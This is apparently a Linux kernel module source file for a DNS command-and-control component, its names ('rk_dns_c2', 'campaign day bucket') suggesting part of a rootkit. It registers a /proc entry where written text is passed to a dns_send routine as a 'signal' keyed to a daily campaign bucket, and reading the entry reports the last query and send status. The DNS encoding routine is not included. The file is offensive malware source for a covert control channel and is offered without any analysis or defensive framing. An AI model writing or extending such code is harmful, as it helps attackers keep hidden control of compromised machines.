// SPDX-License-Identifier: GPL-2.0
#include "dns_c2.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/mutex.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/timekeeping.h>
#include <linux/uaccess.h>

static ulong bucket;
module_param(bucket, ulong, 0444);
MODULE_PARM_DESC(bucket, "Campaign day bucket; zero selects the current day");

static DEFINE_MUTEX(transaction_lock);
static struct proc_dir_entry *control_entry;
static char last_query[QUERY_TEXT_SIZE] = "none";
static u64 last_bucket;
static u16 last_id;
static int last_sent;

static u64 selected_bucket(void)
{
	return bucket ? bucket : ktime_get_real_seconds() / SECONDS_PER_DAY;
}

static int status_show(struct seq_file *output, void *unused)
{
	mutex_lock(&transaction_lock);
	seq_printf(output, "bucket=%llu\nquery=%s\nid=%u\nsent=%d\n",
		   (unsigned long long)(last_sent ? last_bucket : selected_bucket()),
		   last_query, last_id, last_sent);
	mutex_unlock(&transaction_lock);
	return 0;
}

static int status_open(struct inode *inode, struct file *file)
{
	return single_open(file, status_show, NULL);
}

static ssize_t send_signal(struct file *file, const char __user *buffer,
			   size_t count, loff_t *position)
{
	char signal[SIGNAL_BUFFER_SIZE];
	char query[QUERY_TEXT_SIZE];
	size_t length = count;
	u64 used_bucket;
	u16 id;
	int error;
	int sent;

	if (!count || count >= sizeof(signal))
		return -EINVAL;
	if (copy_from_user(signal, buffer, count))
		return -EFAULT;
	if (signal[length - 1] == '\n')
		length--;
	if (!length)
		return -EINVAL;
	signal[length] = '\0';

	mutex_lock(&transaction_lock);
	used_bucket = selected_bucket();
	error = dns_send(signal, used_bucket, query, sizeof(query), &sent, &id);
	if (!error) {
		strscpy(last_query, query, sizeof(last_query));
		last_bucket = used_bucket;
		last_id = id;
		last_sent = sent;
	}
	mutex_unlock(&transaction_lock);
	return error ? error : count;
}

static const struct proc_ops control_ops = {
	.proc_open = status_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
	.proc_write = send_signal,
};

static int __init dns_c2_init(void)
{
	control_entry = proc_create("rk_dns_c2", 0600, NULL, &control_ops);
	return control_entry ? 0 : -ENOMEM;
}

static void __exit dns_c2_exit(void)
{
	proc_remove(control_entry);
}

module_init(dns_c2_init);
module_exit(dns_c2_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Authenticated DNS signal");
